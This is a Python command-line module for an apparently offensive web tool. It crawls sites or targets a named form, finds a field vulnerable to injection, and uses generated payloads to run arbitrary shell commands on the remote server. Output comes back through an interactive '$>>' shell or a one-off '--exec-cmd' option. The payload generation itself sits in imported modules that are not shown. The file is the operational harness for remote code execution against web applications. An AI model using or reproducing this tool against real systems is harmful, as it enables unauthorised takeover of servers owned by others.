import logging
from urllib.parse import urlparse
from traceback import print_exc

from .test_form import test_form, Form, submit_form_input
from .request import common_request
from .scan_url import yield_form
import click

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("cli")


def interact(cmd_exec):
    logger.warning("Use Ctrl+D to exit.")
    while True:
        try:
            cmd = input("$>> ")
        except EOFError:
            break
        try:
            result = cmd_exec(cmd)
            print(result)
        except Exception:
            print_exc()


@click.group()
def main():
    pass


@main.command()
@click.option("--url", help="form所在的URL")
@click.option("--action", default=None, help="form的action，默认为当前路径")
@click.option("--method", default="POST", help="form的提交方式，默认为POST")
@click.option("--inputs", help="form的参数，以逗号分隔")
@click.option("--exec-cmd", default="", help="成功后执行的shell指令，不填则进入交互模式")
def crack(url, action, method, inputs, exec_cmd):
    assert all(param is not None for param in [
               url, inputs]), "Please check your param"
    if action is None:
        action = urlparse(url)[3]
    form = Form(
        action=action,
        method=method,
        inputs=inputs.split(",")
    )
    payload_gen, field = test_form(url, form)
    if payload_gen is None:
        logger.warning("Test form failed...")
        return

    cmd_exec_func = lambda cmd : submit_form_input(
            url, form, {field: payload_gen(cmd)}).text
    if exec_cmd == "":
        interact(cmd_exec_func)
    else:
        print(cmd_exec_func(exec_cmd))
    logger.warning("Bye!")


@main.command()
@click.option("--url", help="需要扫描的URL")
@click.option("--exec-cmd", default="", help="成功后执行的shell指令，不填则进入交互模式")
def scan(url, exec_cmd):
    for page_url, forms in yield_form(url):
        for form in forms:
            payload_gen, field = test_form(page_url, form)
            if payload_gen is None:
                continue
            cmd_exec_func = lambda cmd : submit_form_input(
                    url, form, {field: payload_gen(cmd)}).text
            if exec_cmd == "":
                interact(cmd_exec_func)
            else:
                print(cmd_exec_func(exec_cmd))
            return
    logger.warning("Scan failed...")

if __name__ == '__main__':
    main()
